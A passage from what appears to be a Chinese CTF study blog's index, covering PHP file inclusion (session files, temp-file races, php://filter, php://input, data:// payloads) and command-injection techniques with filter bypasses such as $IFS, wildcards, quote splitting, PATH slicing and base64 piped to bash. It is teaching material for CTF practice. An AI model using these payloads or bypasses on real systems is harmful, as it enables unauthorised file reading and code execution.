<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/php/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sess_PHPSESSID</span><br><span class="line"><span class="regexp">/tmp/</span>sessions/sess_PHPSESSID</span><br><span class="line">session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;看个题目，懂了说明你掌握了<a href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">Session包含</a>  </p>
<h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>&emsp;&emsp;php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。  </p>
<p>&emsp;&emsp;由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。  </p>
<p>&emsp;&emsp;另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。  话不多说，看题<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">时间竞争临时文件</a></p>
<h3 id="远程文件包含（RFI）"><a href="#远程文件包含（RFI）" class="headerlink" title="远程文件包含（RFI）"></a>远程文件包含（RFI）</h3><p>&emsp;&emsp;如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include&#x2F;require函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI),这个需要自己有个web服务器，具体使用方法可以去CSDN看看大佬的blog</p>
<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><p>&emsp;&emsp;文件包含的重中之重，是一定需要掌握的。可以说，看见文件包含的题目就要想到伪协议。如下  </p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;需要熟练掌握的有  </p>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>&emsp;&emsp;是一种元封装器，类似readfile(),file()等，可以获取指定文件源码（要知道，通常来说不会有人直接把源码放出来的，除了打比赛），所以我们需要用它来完成获取，php:&#x2F;&#x2F;filter流会被当做php文件执行，所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。<br>&emsp;&emsp;最常用也是最好用的payload  </p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/resource=index.php</span><br></pre></td></tr></table></figure>

<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>&emsp;&emsp;当我们无法读取到有用信息或者不知道读取哪个php文件时，我们可以利用流写入一句话木马进去，详情请转到<a href="/2024/07/14/php-filter-chain-generator/">php_filter_chain_generator</a>脚本参考</p>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>&emsp;&emsp;可以访问请求的原始数据的只读流,<strong>将post请求的数据当作php代码执行</strong>,当传入的参数作为文件名打开时，可以<strong>将参数设为php:&#x2F;&#x2F;input</strong>,同时<strong>post写入想要执行的php代码</strong>，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p>
<h4 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain"></a>data:&#x2F;&#x2F;text&#x2F;plain</h4><p>&emsp;&emsp;在后面写入你想写入的数据给参数，例如<strong>data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></strong>,如果对特殊字符进行了过滤，可以进行base64编码，data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; 这个不常用，有这条件可以用php:&#x2F;&#x2F;input（doge）</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;剩下的伪协议不常见也不常考（至少我还没遇到( ͡°❥ ͡°)），能学到这已经很不错了，重点在于实操去做题，两个字：沉淀，这些知识点在网上有很多资料都可以查到，我写的很多都是网上照抄的（(ฅ•﹏•ฅ)），我写在blog里一来是为了引导学习路线，写的不详细或者看不懂的地方可以复制目录去搜索相关知识点，二来就是自己整理知识点，加强印象。希望各位师傅们能够在web道路上走得更快更远ヾ(❀╹◡╹)ﾉﾞ❀~</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2024/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>&emsp;&emsp;命令执行可以说是贯彻整个比赛的要点，不然你发现漏洞了都不知道怎么提取flag，别告诉我你只会F12，ctrl+U找(๑‾᷅^‾᷅๑)</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;&emsp;这类知识点主要靠对函数和命令的熟练度和扩展度，能达成目的的方法不止一步，要掌握常见的函数和文件读取的命令，同时要学会如何利用一些特性去绕过黑名单。推荐去B站看橙子科技的视频，那里不止有命令执行的，希望对你有帮助。</p>
<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>&emsp;&emsp;最常用的也是最好用的函数，通常能用system了就代表里找到flag不远了，最常规的用法就是<font color=blue>system(“ls”);</font>确认一下flag所在文件名，然后<font color=blue>system(“cat flag.php”);</font>注意：大多数情况下分号也是不能少的，因为这是一条语句。<br>&emsp;&emsp;当然也会出现找不到flag的现象，我们可以用<font color=red>system(“ls &#x2F;“);</font>去根目录找，也可以<font color=red>system(“env”);</font>调用环境变量去找，注意：有的题目flag所在的文件名不是flag.php，去找相类似的，或者很长很怪的文件名去试。在不济，就使用一句话木马连接蚁剑去翻，详情去木马那一章去看。</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>&emsp;&emsp;exec通常有两个参数，exec($command,$output),第一个参数输入要执行的命令，作为单独使用时只有最后一行的结果，且不会回显；第二个参数是将命令执行的输出填充此数组，逐行填充数组（二维数组），用法：使用var_dump或 print_r输出output里面的$变量。 例如：<font color=blue>print_r($output);</font></p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>&emsp;&emsp;一个参数，输入要执行的命令，会输出二进制的数据，并直接回显，且回显的是正常数据，和system一样好用，例如：<font color=blue>passthru(“ls”);</font></p>
<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>&emsp;&emsp;看到exec就要想到这是不回显的，但是区别就是它只有一个参数,用一个变量去接它，然后使用echo和print等输出结果，例如：<font color=red>$output &#x3D; shell_exec(‘ls’); echo $output;</font>  </p>
<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号` `"></a>反引号` `</h4><p>&emsp;&emsp;这个同shell_exec一样，也是用echo和print输出结果，它需要跟单引号‘’分清楚，反引号在数字1的左边那个才是，弄错了输出的结果肯定也不一样。建议自己去试一下。<br><img data-src="/images/%E5%8F%8D%E5%BC%95%E5%8F%B7.png" alt="反引号"> </p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>&emsp;&emsp;两个参数popen($command,$mode),第一个参数输入命令，第二参数为模式，’r’表示阅读，’w’表示写入。同上面不同的是，有个open，这个有关文件，所以要先用fgets读取再用print_r输出，例如：  </p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">popen</span>($command,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>($output=fgets($a))</span><br><span class="line">&#123;</span><br><span class="line">    print_r($output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;fgets只读取一行，因此需要靠循环遍历。这个不常遇到，可以先了解一下。</p>
<h3 id="常见文件读取命令"><a href="#常见文件读取命令" class="headerlink" title="常见文件读取命令"></a>常见文件读取命令</h3><p>&emsp;&emsp;下面的命令建议打开你的kali或者linux去实践一下，印象更深更明白。在web下，要跟上面的函数搭配使用才是正解。  </p>
<h4 id="ls和cat"><a href="#ls和cat" class="headerlink" title="ls和cat"></a>ls和cat</h4><p>&emsp;&emsp;最常用的一组命令，dddd  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>

<h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>&emsp;&emsp;与cat功能类似，只不过是反向显示（从表面上看就知道，就是cat的reverse）。例如：<font color=bule>tac flag.txt</font></p>
<h4 id="more和less"><a href="#more和less" class="headerlink" title="more和less"></a>more和less</h4><p>&emsp;&emsp;more:一页一页的输出，等同cat，区别自己实践一下。<br>&emsp;&emsp;less: 同上。  </p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">more flag.php</span><br><span class="line"><span class="keyword">less</span> flag.php</span><br></pre></td></tr></table></figure>

<h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>&emsp;&emsp; 显示文件的最后几行（默认显示最后10行），例如：<font color=red>tail flag.php</font>  </p>
<h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>&emsp;&emsp;显示的时候，顺便输出行号,例如：<font color=blue>nl flag.php</font></p>
<h4 id="od和xxd"><a href="#od和xxd" class="headerlink" title="od和xxd"></a>od和xxd</h4><p>&emsp;&emsp;od:以二进制的方式读取档案内容<br>&emsp;&emsp;xxd:读取二进制文件,很显然，有二进制，通常和passthru进行搭配使用</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;od -A d -c flag.php&quot;</span>);</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;xxd flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/images/xxd.png" alt="xxd"></p>
<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>&emsp;&emsp;主要用于排序文件，但也能达成目的，例如:<font color=red>sort flag.txt</font></p>
<h4 id="uniq-file-f-grep"><a href="#uniq-file-f-grep" class="headerlink" title="uniq | file -f | grep"></a>uniq | file -f | grep</h4><p>&emsp;&emsp;uniq:报告或删除文件中重复的行<br>&emsp;&emsp;file -f:报错出具体内容<br>&emsp;&emsp;grep:在文本中查找指定的字符串<br><img data-src="/images/grep.png" alt="grep"></p>
<h3 id="操作系统链接符"><a href="#操作系统链接符" class="headerlink" title="操作系统链接符"></a>操作系统链接符</h3><h4 id=""><a href="#" class="headerlink" title=";"></a>;</h4><p>&emsp;&emsp;这个应该都知道，代表这条语句的结束，后面可以继续跟命令，可以使多个命令按顺序执行，自行去kali试一下，例如<font color=red>id;ls;pwd</font></p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h4><p>&emsp;&emsp;一样的效果，使命令在后台运行，这样就可以同时执行多条命令，注意在GET传参的时候<code>必须URL编码</code>,&amp;的URL为%26。例如<font color=blue>?c&#x3D;ls%26cat flag.php</font></p>
<h4 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>&emsp;&emsp;和逻辑与的语法一样，两边为命令的时候，前面的命令执行成功才会执行后面的命令，反之则不会执行后面的命令，同上，<code>必须URL编码</code>,例如<font color=red>?c&#x3D;ls%26%26cat flag.php</font></p>
<h4 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h4><p>&emsp;&emsp;将前面命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；是不是看起来有点生涩？没关系，看个例题就明白了。<br>&emsp;&emsp;<font color=blue>echo “ls -l”</font>这个是只显示”ls -l”,而不是命令。<br>&emsp;&emsp;<font color=red>echo “ls -l” | &#x2F;bin&#x2F;bash</font>这个是&#x2F;bin&#x2F;bash把”ls -l”当成参数执行，也就是执行了ls -l这条命令。  </p>
<h4 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h4><p>&emsp;&emsp;继承了逻辑或的语法，还有短路原则，换个更容易理解的就是相当于if else语句，若前面的命令执行成功，后面的命令就不会执行，反之执行后面的命令；例如<br>&emsp;&emsp;<font color=blue>ls || &gt;dev&#x2F;null 2&gt;&amp;1</font>后者相当于一个垃圾桶，你的所有输出都会被丢进去,”&gt;”代表的是重定向，还有2和1具体代表什么感兴趣的可以再去看一下，目前只要知道这样的格式代表的是垃圾桶就好。好，回归正题，如果没有||，作为顺序输出的话，就不会有回显；反之，ls正常输出，后面就不会执行了。</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="替换函数绕过"><a href="#替换函数绕过" class="headerlink" title="替换函数绕过"></a>替换函数绕过</h4><p>&emsp;&emsp;之所以介绍这么多常见的命令和函数就是为了达成这个目的，看黑名单内没有其中的哪些（个）函数和命令就可以用它实现一样的效果。例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/exec/system/popen/proc_open|\`/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;很明显，对照上面的函数，还有passthru没有过滤，就可以使用该函数，<font color=blue>?c&#x3D;passthru(“ls”);</font></p>
<h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>&emsp;&emsp;空格过滤是属于比较烦的一种，尤其在SQL注入中┻┻︵⁞&#x3D;༎ຶ﹏༎ຶ&#x3D;⁞︵┻┻，算了，我们先看这里的。</p>
<h5 id="大括号"><a href="#大括号" class="headerlink" title="大括号{}"></a>大括号{}</h5><p>&emsp;&emsp;顾名思义就是用大括号将命令括起来，中间用，分割，例如<font color=red>{cat,flag.txt};</font>  </p>
<h5 id="IFS-代替空格"><a href="#IFS-代替空格" class="headerlink" title="$IFS 代替空格"></a>$IFS 代替空格</h5><p>&emsp;&emsp;这个建议去kali用一下，原理就是Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符，既然是分隔符，就能起到空格的作用。通常能单纯的$IFS会被当作变量名，就加一对{}固定变量名所以就是${IFS}，例如<font color=blue>ls${IFS}-l</font><br>&emsp;&emsp;再者就是$IFS$9，后面加个$和{}类似，起截断作用，$9是当前系统shell进程的第九个参数，代表这空字符串，所以这也是一种,例如<font color=red>ls$IFS$9-l</font><br>&emsp;&emsp;这两个在题目中最常用也最好用了，要知道。  </p>
<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>&emsp;&emsp;就是使用空格和制表符的URL编码代替空格，在执行是会自动转换为空格使用，%09（tab）%20（space），例如<font color=blue>cat%09flag.php</font>和<font color=red>cat%20flag.php</font></p>
<h5 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;,&lt;&gt;"></a>重定向字符&lt;,&lt;&gt;</h5><p>&emsp;&emsp;上面也提过一嘴，就是把&lt;后面跟的文件取代键盘作为新的输入设备，具体原理我也不清楚（谁会了到时候指导我一下ヾ(❀╹◡╹)ﾉﾞ❀~），不推荐使用，用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>

<h4 id="特定字符过滤绕过"><a href="#特定字符过滤绕过" class="headerlink" title="特定字符过滤绕过"></a>特定字符过滤绕过</h4><p>&emsp;&emsp;这种过滤一般针对一些特定的字符，全过滤的在后面，比如flag这四个，或者f,l,a,g四个字符单独过滤，后者意味这不能有这四个字母的出现，前者只是它们不能连着，很显然，后者相对难处理些，那么，就看看有哪些方法吧。</p>
<h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><p>&emsp;&emsp;通配符是整个操作系统都认可的一种形式，用来模糊搜索文件。只有这两个?和*<br>&emsp;&emsp;?可以代表任何<code>单个</code>字符串，来让系统自行继续匹配搜索。例如<font color=blue>cat fl?g.tx?</font><br>&emsp;&emsp;*可以进行模糊匹配，代表任何字符串，让系统自己猜我要什么- ̗̀(๑ᵔ⌔ᵔ๑)。例如<font color=red>cat f*</font>(如果有多个匹配结果会同时显示)</p>
<h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><p>&emsp;&emsp;原理就是接一个’’或者””里面什么都没有默认空字符，然后系统再拼接在一起，例如<font color=blue>cat fl’’ag.ph””p</font></p>
<h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><p>&emsp;&emsp;这个就是将特性字符去掉功能性，单纯表示为字符串，比如反引号，要想表现出来得在前面加, 比如”`“(这里我加了,只是你们看不到而已)同理，我们就可以用它将他们分隔开，在命令中同样有效，例如<font color=red>cat fl\ag.t\xt</font>  </p>
<h5 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h5><p>&emsp;&emsp;上面就有提到，$9作为特殊的环境变量，代表着空字符，所以也可以用，例如<font color=blue>cat fl$9.txt</font>  </p>
<h5 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h5><p>&emsp;&emsp; 之前不是说过操作系统链接符可以顺序嘛，我们就可以先自定义字符串，再拼接起来,例如<font color=red>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt</font>  </p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>&emsp;&emsp;众所周知，目标服务器在识别到编码后会自动解码读取命令并执行，就可以绕过那个笨比检测了（Ｕ・ω・）⊃<br>&emsp;&emsp;比如最熟悉的base编码（64,32都可），将命令编码一下再传输就可以了。通常通过管道符执行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2FOIGZsYWcucGhw | <span class="built_in">base64</span> -d  | bash</span><br></pre></td></tr></table></figure>

<h5 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h5><p>&emsp;&emsp;呐，又是这两个&gt;,&gt;&gt;。知道一下就可以（其实是我也不擅长doge），通常用来做长度限制绕过的，不常用。  </p>
<p>  &emsp;&emsp;下面的方法专门针对单独过滤情况。  </p>
<h5 id="利用Linux的环境变量和区间取值"><a href="#利用Linux的环境变量和区间取值" class="headerlink" title="利用Linux的环境变量和区间取值"></a>利用Linux的环境变量和区间取值</h5><p>&emsp;&emsp;在Linux中PATH是默认系统环境变量，我们可以使用特殊的调用方法，来提取相应的字符，每个字符对应一个下标，从0开始，跟数组一样。但有限，论好用还得是区间取值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> f<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span><span class="variable">$&#123;PATH:72:1&#125;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;区间取值就是顾名思义，用[]框起来表示范围，然后让Linux自行匹配。顺带提一句，八进制也可以执行。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">more <span class="selector-attr">[d-h]</span><span class="selector-attr">[k-m]</span><span class="selector-attr">[9-z]</span><span class="selector-attr">[e-h]</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\146\154\141\147&#x27;</span>  <span class="comment">//cat flag</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/images/PATH.png" alt="PATH"></p>
<h4 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h4>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
</search>
